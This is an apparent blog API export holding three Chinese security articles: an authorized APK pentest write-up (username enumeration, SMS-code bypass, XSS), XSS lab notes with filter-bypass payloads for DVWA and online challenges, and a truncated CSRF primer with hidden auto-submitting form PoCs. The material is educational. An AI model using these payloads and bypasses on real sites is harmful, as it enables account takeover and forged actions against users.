{"total":49,"pageSize":8,"pageCount":7,"data":[{"title":"APP Penetration testing","slug":"Penetration-testing","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:52.700Z","comments":true,"path":"api/articles/Penetration-testing.json","excerpt":"","keywords":null,"cover":"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg","content":"<h1 id=\"记一次授权的APK渗透测试\"><a href=\"#记一次授权的APK渗透测试\" class=\"headerlink\" title=\"记一次授权的APK渗透测试\"></a>记一次授权的APK渗透测试</h1><p>作为一个渗透测试小白，本文的目的是希望能为那些和我一样的小白提供一些测试思路。</p>\n<p>涉及的内容可能比较基础，表哥们见谅。</p>\n<h2 id=\"APK-解包\"><a href=\"#APK-解包\" class=\"headerlink\" title=\"APK 解包\"></a>APK 解包</h2><p>拿到 apk 之后直接用 7-Zip 解压可以得到几个文件夹、一个 <strong>AndroidManifest.xml</strong> 文件、一个dex文件。使用 dex2jar <a href=\"https://sourceforge.net/projects/dex2jar/\" title=\"工具\" target=\"_blank\" rel=\"noopener\">https://sourceforge.net/projects/dex2jar/</a> 将这个dex文件解压会生成一个jar文件，然后使用jd-gui就可以查看java源代码了。</p>\n<p>当然可以从源码里找代码的漏洞，但是一般会有混淆，在这也不做深入讨论。</p>\n<p>上边提到的 xml 文件一定不能发放过，里边涉及到许多重要的配置项，比如：</p>\n<ul>\n<li>AndroidManifest.xml文件中android:debuggable为true。app 可被任意调试</li>\n<li>AndroidManifest.xml文件中android: allowBackup为true。app 数据可以被备份导出。</li>\n<li>等等…</li>\n</ul>\n<p>还有一点在实际测试过程中可能会用到：在对 apk 解压之后可以尝试在 powershell 里边搜一下 <code>db</code> 文件，说不定有敏感信息(为什么这么说，因为我碰到过一次…)</p>\n<pre><code>for /r F:\\source-code %i in (*.db) do echo %i </code></pre><h2 id=\"登陆页面\"><a href=\"#登陆页面\" class=\"headerlink\" title=\"登陆页面\"></a>登陆页面</h2><h3 id=\"用户名可枚举\"><a href=\"#用户名可枚举\" class=\"headerlink\" title=\"用户名可枚举\"></a>用户名可枚举</h3><p>输入用户名之后响应用户名不存在，这就是最简单的枚举用户名的情形了。</p>\n<p>这次碰到的是登陆不需要密码，但是要输入已经注册过的用户名，之后会根据用户名发送验证码到对应手机，同时设置了 120s 内不能重新发送，并且验证码 120s 内有效。</p>\n<p>这时候看起来我们没办法通过验证码做什么事，但是在实际测试过程中发现</p>\n<ol>\n<li><p>当我们输入存在的账号之后提示发送成功；</p>\n</li>\n<li><p>重复发送，会响应 120s 内不能重复发送；</p>\n</li>\n<li><p>输入不存在用户会提示发送失败。</p>\n</li>\n</ol>\n<p>所以这个时间限制对用户名枚举其实没什么影响，我们可以通过爆破用户名根据返回的信息来查看用户名是否存在。</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg\" alt=\"枚举用户\"></p>\n<p>等等，既然咱都不知道手机号，也不让输密码登陆，就算得到用户名生成社工字典也没法用啊，那拿到了用户名有什么用？</p>\n<p>当然有用，不过要看具体场景，比如下面这个案例</p>\n<h3 id=\"任意验证码绕过\"><a href=\"#任意验证码绕过\" class=\"headerlink\" title=\"任意验证码绕过\"></a>任意验证码绕过</h3><p>当我们登陆时服务端给账号绑定的手机号发送短信验证码，我们输入一个上一步得到的账号，验证码随便输，点击登陆后抓包，登陆失败，发现响应中有两个 code 字段</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w9rlloj30l2070aaa.jpg\" alt></p>\n<p>改改试试：</p>\n<p><img src=\"https://wx1.sinaimg.cn/mw690/006boCb9ly1ga98wgjh7kj30is057mx6.jpg\" alt></p>\n<p><strong>It works!</strong></p>\n<h2 id=\"功能页面\"><a href=\"#功能页面\" class=\"headerlink\" title=\"功能页面\"></a>功能页面</h2><p>成功登录之后，各个功能都点点看看，在个人信息页面有一个查询实时在线人数功能，那一栏只显示了人数，旁边并没有箭头</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wd0il6j307n04bdfo.jpg\" alt></p>\n<p>我一度以为那里不能点击(事实上因为数据量太大，加载了好长时间，我直接点返回了，给我的感觉就是这里没有东西)，进去之后就可以看到所有登陆人员的信息了。</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98voejstj30qf09pdh7.jpg\" alt=\"图打码水平实在不够\"></p>\n<p>在我尝试了不同用户之后，发现这里的用户信息并没有权限限制，也就是说对所有人都是可见的，明显的权限配置不当。</p>\n<p>除此之外，应用存在几处查询功能，通过BURP 看到返回的数据包都是 JSON 类型</p>\n<p><img src=\"https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wmervqj30m404vt90.jpg\" alt></p>\n<p>因为没什么经验，所以就多尝试吗，在 json 那里注入，xxe 都来一遍，没啥用。</p>\n<p>前面还有一个参数，试试？</p>\n<p><img src=\"https://wx4.sinaimg.cn/mw690/006boCb9ly1ga98x8llxwj30q203f74b.jpg\" alt></p>\n<p>有戏！</p>\n<p>试试 xss 吧</p>\n<p><img src=\"https://wx2.sinaimg.cn/mw690/006boCb9ly1ga98xbyv4fj30q002q74d.jpg\" alt></p>\n<p>放到浏览器成功弹窗！</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>平时做测试还是要细心，多总结，每一个能输入的地方都不能放过，多试试总是好的。</p>\n","text":"记一次授权的APK渗透测试作为一个渗透测试小白，本文的目的是希望能为那些和我一样的小白提供一些测试思路。涉及的内容可能比较基础，表哥们见谅。APK 解包拿到 apk 之后直接用 7-Zip 解压可以得到几个文件夹、一个 AndroidManifest.xml 文件、一个dex文件","link":"","raw":null,"photos":[],"categories":[{"name":"渗透测试","slug":"渗透测试","count":5,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"APK","slug":"APK","count":1,"path":"api/tags/APK.json"}]},{"title":"XSS 学习","slug":"xss备忘","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:51.496Z","comments":true,"path":"api/articles/xss备忘.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"xss备忘\"><a href=\"#xss备忘\" class=\"headerlink\" title=\"xss备忘\"></a>xss备忘</h1><p>11/1/2019 10:50:21 AM </p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"reflected\"><a href=\"#reflected\" class=\"headerlink\" title=\"reflected\"></a>reflected</h3><p><strong>low</strong></p>\n<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {\n    // Get input\n    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );\n\n    // Feedback for end user\n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;\n}\n\n?&gt; </code></pre><p>黑名单过滤，采用正则不区分大小写，双写、大小写混淆不行了，但是我们可以使用其他的事件标签：</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); \n    // Feedback for end user \n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h2 id=\"Stored\"><a href=\"#Stored\" class=\"headerlink\" title=\"Stored\"></a>Stored</h2><p><strong>low</strong></p>\n<p>name 处长度限制， Message 处尝试 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>\n<p><strong>medium</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> 移除字符串中的 HTML、XML 以及 PHP 标签，但允许使用 <code>&lt;b&gt;</code> 标签。  <code>addslashes</code>  返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串； <code>htmlspecialchars</code> 对参数进行实体编码，无法再对 <code>message</code> 进行 XSS ，但是 <code>name</code> 处可以通过修改长度进行 xss。</p>\n<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>似曾相识呢😋</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \nif( isset( $_POST[ &apos;btnSign&apos; ] ) ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); \n    $name    = trim( $_POST[ &apos;txtName&apos; ] ); \n    // Sanitize message input \n    $message = stripslashes( $message ); \n    $message = mysql_real_escape_string( $message ); \n    $message = htmlspecialchars( $message ); \n    // Sanitize name input \n    $name = stripslashes( $name ); \n    $name = mysql_real_escape_string( $name ); \n    $name = htmlspecialchars( $name ); \n    // Update database \n    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); \n    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); \n    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); \n    $data-&gt;execute(); \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><strong>low</strong>    </p>\n<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n    $default = $_GET[&apos;default&apos;];\n\n    # Do not allow script tags\n    if (stripos ($default, &quot;&lt;script&quot;) !== false) {\n        header (&quot;location: ?default=English&quot;);\n        exit;\n    }\n} </code></pre><p>过滤了 <code>&lt;script</code> ,观察页面源码，手动闭合事件标签 <code>&lt;/option&gt;</code> 、 <code>&lt;/select&gt;</code>，由于代码只检测 <code>$default</code> ,于是我们后面的代码可以逃逸。</p>\n<p>payload:</p>\n<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n\n    # White list the allowable languages\n    switch ($_GET[&apos;default&apos;]) {\n        case &quot;French&quot;:\n        case &quot;English&quot;:\n        case &quot;German&quot;:\n        case &quot;Spanish&quot;:\n            # ok\n            break;\n        default:\n            header (&quot;location: ?default=English&quot;);\n            exit;\n    }\n}</code></pre><p>URL 中所有在 # 之后的都会被分割，不会发送到服务端，因此不会被过滤，恶意代码会在创建页面时被用来渲染<br>读取页面内容。</p>\n<p>payload:</p>\n<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>浏览器如何渲染一个页面，找到一篇国外的文章：<a href=\"https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969\" target=\"_blank\" rel=\"noopener\">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>\n<p>HTML事件属性：<a href=\"https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>\n<h1 id=\"下面是另一个-xss-靶场\"><a href=\"#下面是另一个-xss-靶场\" class=\"headerlink\" title=\"下面是另一个 xss 靶场\"></a>下面是另一个 xss 靶场</h1><p>靶场地址：<a href=\"https://alf.nu/alert1\" target=\"_blank\" rel=\"noopener\">https://alf.nu/alert1</a></p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的值没有过滤直接拼接到字符串中，闭合前面的标签即可</p>\n<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;\n1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id=\"Adobe\"><a href=\"#Adobe\" class=\"headerlink\" title=\"Adobe\"></a>Adobe</h2><pre><code>function escape(s) {\n  s = s.replace(/&quot;/g, &apos;\\\\&quot;&apos;);\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的 <code>&quot;</code> 加了一个转义，但是我们可以闭合 <code>&lt;script&gt;</code> 标签，或者用 <code>\\</code> 再次转义</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;\n\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\n\n\\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><pre><code>function escape(s) {\n  s = JSON.stringify(s);\n  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;\n}</code></pre><p>与第二题一样</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h3><pre><code>function escape(s) {\n  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);\n  // URLs\n  text = text.replace(/(http:\\/\\/\\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);\n  // [[img123|Description]]\n  text = text.replace(/\\[\\[(\\w+)\\|(.+?)\\]\\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);\n  return text;\n}</code></pre><p>第一行过滤将所有 <code>&lt; &quot;</code> 进行实体编码</p>\n<p>第二行将所有 <code>http://S+</code> 替换为 <code>&lt;a href=&quot;https://S+&quot;&gt;htp://S+&lt;/a&gt;</code> ,这里 S+ 为匹配一个非空白字符一次或多次。</p>\n<p>第三行将 <code>[[a|b]]</code> 替换为 <code>&lt;img alt=&quot;b&quot; src=&quot;a.gif&quot;&gt;</code></p>\n<p>payload: <code>[[a|http://onerror=alert(1)//]]</code></p>\n<p>输出：</p>\n<pre><code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=alert(1)//&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=alert(1)//]]&lt;/a&gt;</code></pre><p>通过 <code>http://onerror=alert(1)//</code> 引入 <code>alt=&quot;***&quot;</code> ,此时引号内的内容触发第二行的检测 替换为<code>&lt;a href=&quot;http://onerror=alert(1)//&quot;&gt;http://onerror=alert(1)//&lt;/a&gt;</code> 此时 <code>href</code> 带来的 <code>&quot;</code> 将 <code>alt</code> 的引号闭合，同时 <code>//</code> 将后面的代码注释掉，造成 <code>http://onerror=alert(1)</code> 逃逸出来。</p>\n<h3 id=\"DOM-1\"><a href=\"#DOM-1\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><pre><code>function escape(s) {\n  // Slightly too lazy to make two input fields.\n  // Pass in something like &quot;TextNode#foo&quot;\n  var m = s.split(/#/);\n\n  // Only slightly contrived at this point.\n  var a = document.createElement(&apos;div&apos;);\n  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));\n  return a.innerHTML;\n}</code></pre><p>通过 <code>split</code> 对传入的 s 进行分割<br>    var s=”creat#foo”; var m=s.split(/#/); m<br>    Array [ “creat”, “foo” ]</p>\n<pre><code>document[&apos;create&apos;+m[0]].apply(document, m.slice(1)) </code></pre><p>相当于调用了 document.creatXXX() ,这里有几个常用的创建 DOM 节点方法</p>\n<pre><code>createElement() 创建一个元素节点\ncreateTextNode() 创建一个文本节点\ncreateAttribute() 创建一个属性节点\ncreateComment() 创建一个注释节点</code></pre><p>测试最后一个：</p>\n<pre><code>document.createComment(11111);\n&lt;!-- 11111 --&gt;</code></pre><p>Payload: 闭合注释</p>\n<pre><code>Comment#&gt;&lt;iframe onload=alert(1)            &lt;!--&gt;&lt;iframe onload=alert(1)--&gt;</code></pre><h2 id=\"Skandia\"><a href=\"#Skandia\" class=\"headerlink\" title=\"Skandia\"></a>Skandia</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;\n}</code></pre><p>对输入的 s 全部变成大写，直接输入 <code>alert</code> 变成 <code>ALERT</code> 之后无法执行。</p>\n<p>利用 HTML 编码绕过</p>\n<pre><code>&lt;/script&gt;&lt;img src onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code></pre><p>关于浏览器如何处理编码，贴一篇大佬博客：<a href=\"http://bobao.360.cn/learning/detail/292.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/learning/detail/292.html</a></p>\n<h2 id=\"Callback\"><a href=\"#Callback\" class=\"headerlink\" title=\"Callback\"></a>Callback</h2><h1 id=\"http-xss-quiz-int21h-jp\"><a href=\"#http-xss-quiz-int21h-jp\" class=\"headerlink\" title=\"http://xss-quiz.int21h.jp\"></a><a href=\"http://xss-quiz.int21h.jp\" target=\"_blank\" rel=\"noopener\">http://xss-quiz.int21h.jp</a></h1><h2 id=\"Stage-3\"><a href=\"#Stage-3\" class=\"headerlink\" title=\"Stage 3\"></a>Stage 3</h2><p>先尝试 <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></p>\n<p>查看源码发现被转义成</p>\n<pre><code>aaa&amp;lt;bbb&amp;gt;ccc/ddd&amp;#039;eee&amp;quot;fff;ggg:hhh</code></pre><p>看起来无法成功了，但是旁边还有个下拉栏，我们抓包试试修改第二个参数：</p>\n<pre><code>p1=Lodan&amp;p2=&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>It works! 这一关只是防御了第一个栏位，以后要多留心类似的。</p>\n<h2 id=\"Stage-4\"><a href=\"#Stage-4\" class=\"headerlink\" title=\"Stage 4\"></a>Stage 4</h2><p>看起来和第三关一样，仍然是先测试，发现被转义，抓包发现多了一个参数 p3 ，首先对新参数进行测试，修改成 <code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code> 发包发现还是失败，查看源码之后与第二关一样闭合 <code>&quot;&gt;</code> 即可。</p>\n<h2 id=\"Stage-5\"><a href=\"#Stage-5\" class=\"headerlink\" title=\"Stage 5\"></a>Stage 5</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> </p>\n<p>发现只显示了一段，<code>F12</code> ，修改长度再测</p>\n<p>没有过滤。</p>\n<p>好了，修改长度，直接插入吧！ </p>\n<p>试完没成功，再看看源码，原来是没闭合 <code>value</code> ，手动闭合提交：</p>\n<p>stage5 的作用只是想告诉我们 <strong>客户端的防护是无效的</strong></p>\n<h2 id=\"Stage-6\"><a href=\"#Stage-6\" class=\"headerlink\" title=\"Stage 6\"></a>Stage 6</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , <code>&lt; &gt;</code>被转义，而且没有其他的我们可以控制的栏位，这怎么搞？</p>\n<p>答案是用 html 语法，XSS不是只能插入 JS ，还可以使用 HTML 语法，不用 <code>&lt;&gt;/</code> 利用事件触发</p>\n<pre><code>&quot; onclick=alert(document.domain); &quot;</code></pre><h2 id=\"Stage-7\"><a href=\"#Stage-7\" class=\"headerlink\" title=\"Stage 7\"></a>Stage 7</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> ,这次连 <code>&quot;</code> 都转移了</p>\n<p>还是使用 html 语法，使用空格分割属性，加入一个 <code>&quot;</code> 来结束前面的语句</p>\n<h2 id=\"Stage-8\"><a href=\"#Stage-8\" class=\"headerlink\" title=\"Stage 8\"></a>Stage 8</h2><p>还是先测试： <code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code> , 这次是将输入插入到超链接里，我们直接插入</p>\n<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></pre><p>行不通，因为我们点链接发现是 <code>404</code> ，换成 <code>JavaScript</code> 试试</p>\n<pre><code>javascript:alert(document.domain);</code></pre><p>插入后点击链接：</p>\n<h2 id=\"Stage-9\"><a href=\"#Stage-9\" class=\"headerlink\" title=\"Stage 9\"></a>Stage 9</h2><p>不支持 UTF-7 编码，所以跳过</p>\n<h2 id=\"Stage-10\"><a href=\"#Stage-10\" class=\"headerlink\" title=\"Stage 10\"></a>Stage 10</h2><h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><blockquote>\n<p><a href=\"https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html\" target=\"_blank\" rel=\"noopener\">https://blog.davidh83110.com/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/10/xss.html</a></p>\n</blockquote>\n","text":"xss备忘11/1/2019 10:50:21 AM DVWAreflectedlow&lt;script&gt;alert(1);&lt;/script&gt;medium&lt;scRiPt&gt;alert(1);&lt;/script&gt;high&lt;?phphea","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"XSS","slug":"XSS","count":1,"path":"api/tags/XSS.json"}]},{"title":"CSRF 简单认识","slug":"CSRF-简单学习","date":"2019-12-22T03:47:20.000Z","updated":"2019-12-22T04:22:38.699Z","comments":true,"path":"api/articles/CSRF-简单学习.json","excerpt":"","keywords":null,"cover":"https://wx3.sinaimg.cn/small/006boCb9ly1ga5drxec7uj30su014jr9.jpg","content":"<h1 id=\"CSRF-简单认识\"><a href=\"#CSRF-简单认识\" class=\"headerlink\" title=\"CSRF 简单认识\"></a>CSRF 简单认识</h1><p>12/22/2019 11:47:20 AM </p>\n<h2 id=\"什么是CSRF\"><a href=\"#什么是CSRF\" class=\"headerlink\" title=\"什么是CSRF\"></a>什么是CSRF</h2><p>跨站请求伪造-Cross Site Request Forgery，也被称作XSRF，简单来说就是 攻击者在不知道某个账户账号密码的情况下，利用目标站点已经登陆过的账户产生的身份凭证信息(cookie)来进行一系列操作，同时该站点认为攻击者所采取的动作都是合法的(因为攻击者盗用了认证通过的账户账号信息)。</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>如果对于某个网站的删除文章功能的代码是 </p>\n<pre><code>&lt;a href=&apos;/delete?id=3&apos;&gt;刪除&lt;/a&gt;</code></pre><p>然后在后端做校验，验证 requests 有没有带 session_id ,同时确认是不是这个文章的作者。此时，假如攻击者通过钓鱼，创建了一个有针对性的网页，里面的按钮的代码是：</p>\n<pre><code>&lt;a href=&apos;https://small-min.blog.com/delete?id=3&apos;&gt;開始測驗&lt;/a&gt;</code></pre><p>如果这时文章作者点击了按钮，那么由于浏览器的跨域请求机制(在浏览器进程的生命周期内，即使浏览器打开了新的Tab页，Session Cookie 也是有效的。Session Cookie 保存在浏览器内存空间内)会把作者的cookie一起带到GET请求中，服务端检查到确实是作者，于是文章被删除了。</p>\n<p>如果禁用了 <code>&lt;img&gt; 、 &lt;iframe&gt; 、 &lt;script&gt;</code> 等带 src 属性的标签，就可以禁止 CSRF 了？这类标签只能发起一次 GET 请求，而不能发起 POST 请求。但是 <code>form</code> 标签可以发送 POST request.</p>\n<pre><code>&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;\n  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;\n  &lt;input type=&quot;submit&quot; value=&quot;開始測驗&quot;/&gt;\n&lt;/form&gt;</code></pre><p>这样还是显式的，我们可以采用更隐蔽的方式</p>\n<pre><code>&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;\n&lt;form method=&apos;POST&apos; action=&apos;https://small-min.blog.com/delete&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;\n  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;\n  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;\n&lt;/form&gt;\n&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</code></pre><p>在某些页面中可能进行了 referer 检查，但是我们也要检测是否存在逻辑问题：</p>\n<ol>\n<li>Referer 过滤不严谨</li>\n</ol>\n<p>比如我构造了一个表单 <strong>register</strong></p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;csrf test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=&quot;../csrf/server.php&quot; id= &quot;regesiter&quot; method=&quot;post&quot;&gt;\n    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;\n    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre><p>在 server.php 中我对 referer 进行了检测，如果含有 qq.com 我就可以认为是合法的，但是如果我采取以下的请求方式：</p>\n<p><img src=\"https://wx3.sinaimg.cn/small/006boCb9ly1ga5drxec7uj30su014jr9.jpg\" alt=\"构造请求\"></p>\n<p><img src=\"https://wx4.sinaimg.cn/small/006boCb9ly1ga5druqi6ej30df047glu.jpg\" alt=\"referer已经含有关键词\"></p>\n<ol start=\"2\">\n<li>空referer</li>\n</ol>\n<p>某些浏览器的防御部署是允许空 REFERER 的。</p>\n<p>还可以使用 burp 自带的 generate CSRF poc,选择测试 URL 右键选择生成 CSRF poc,将要替换的值然后保存访问即可。</p>\n<p>还可以使用 CSRFTester 软件来测试</p>\n<h2 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" 